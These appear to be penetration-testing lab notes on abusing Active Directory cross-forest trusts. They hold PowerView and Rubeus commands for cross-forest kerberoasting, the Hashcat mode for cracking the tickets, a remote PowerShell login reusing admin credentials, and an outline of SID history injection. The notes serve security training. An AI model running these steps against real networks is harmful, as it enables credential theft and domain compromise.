# Attacking Domain Trusts - Cross-Forest Trust Abuse (Linux)

## Cross-Forest Kerberoasting

### Steps

### Enumerate SPNs

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

### Check Privileged Group Membership

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```

### Request Service Tickets

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Crack Hashes

Use Hashcat mode **13100** on the extracted ticket.

---

## Admin Password Reuse and Group Membership

### Enumerate Foreign Group Memberships

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

### Test Access

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

---

## SID History Abuse in Cross-Forest Attacks

### Concept

* Accounts migrated between domains may retain SID history.
* If SID filtering is not configured, attackers can inject additional SIDs into `sidHistory`.
* The modified account inherits privileges corresponding to the injected SIDs.
